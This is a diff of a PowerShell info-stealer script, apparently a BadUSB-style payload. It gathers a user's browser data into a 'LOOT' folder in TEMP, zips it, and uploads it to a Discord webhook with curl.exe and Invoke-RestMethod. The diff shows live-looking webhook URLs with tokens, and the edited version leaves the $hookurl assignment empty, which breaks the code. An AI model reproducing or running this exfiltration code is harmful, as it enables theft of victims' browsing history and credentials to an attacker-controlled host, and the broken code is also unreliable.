@@ -22,11 +22,13 @@ $proc = Get-Process -Id $PID
 
 # MAKE LOOT FOLDER, FILE, and ZIP 
 
-$FolderName = "$env:USERNAME-LOOT-$(Get-Date -Format 'yyyy-MM-dd_HH-mm')"
-$FileName = "$FolderName.txt"
-$ZIP = "$FolderName.zip"
+$DateStr = Get-Date -Format 'yyyy-MM-dd_HH-mm'
+$BaseName = "$env:USERNAME-LOOT-$DateStr"
+$FolderPath = Join-Path $env:TEMP $BaseName
+$FilePath = Join-Path $FolderPath "$BaseName.txt"
+$ZipPath = Join-Path $env:TEMP "$BaseName.zip"
 
-New-Item -Path "$env:TEMP\$FolderName" -ItemType Directory -Force
+New-Item -Path $FolderPath -ItemType Directory -Force
 
 ############################################################################################################################################################
 
@@ -34,7 +36,7 @@ New-Item -Path "$env:TEMP\$FolderName" -ItemType Directory -Force
 
 #$db = ""
 
-#$dc = 'https://discord.com/api/webhooks/1380227013494964224/eHfXtEMA2iGWfKMp4Zl7bXfYjfalv7HstL1mlQcB1v32hFsF-VV1RuYU7z9sLCmMa2Ir'
+#$dc = 'https://discord.com/api/v10/webhooks/1380240005724770304/ZXWZ-qvvwloOPEwnZqw9wHNi1uuDVK_kmdNGzokReEyjqsHo8m6oDbbjrO2-XBlEctYP'
 
 ############################################################################################################################################################
 
@@ -477,37 +479,29 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\B
 ########################################################################################
 
 function Upload-Discord {
-    [CmdletBinding()]
-    param (
-        [Parameter(Position=0, Mandatory=$false)]
-        [string]$file,
 
-        [Parameter(Position=1, Mandatory=$false)]
-        [string]$text 
-    )
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
 
-    $hookurl = 'https://discord.com/api/webhooks/1380227013494964224/eHfXtEMA2iGWfKMp4Zl7bXfYjfalv7HstL1mlQcB1v32hFsF-VV1RuYU7z9sLCmMa2Ir'
+$hookurl = 
 
-    if (-not [string]::IsNullOrEmpty($text)) {
-        $Body = @{
-            'username' = $env:USERNAME
-            'content'  = $text
-        }
-        Invoke-RestMethod -ContentType 'application/json' -Uri $hookurl -Method POST -Body ($Body | ConvertTo-Json -Depth 10)
-    }
-
-    if (-not [string]::IsNullOrEmpty($file) -and (Test-Path $file)) {
-        curl.exe -F "file1=@`"$file`"" $hookurl
-    }
+$Body = @{
+  'username' = $env:username
+  'content' = $text
 }
 
-# Проверка переменной $dc перед вызовом
-if (-not [string]::IsNullOrEmpty($dc)) {
-    $ZIP = "archive.zip"  # Если ZIP не определён выше — задай его
-    Upload-Discord -file "$env:TEMP\$ZIP"
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
- 
+if (-not ([string]::IsNullOrEmpty($dc))) {Upload-Discord -file $ZipPath}
 
 ############################################################################################################################################################
 
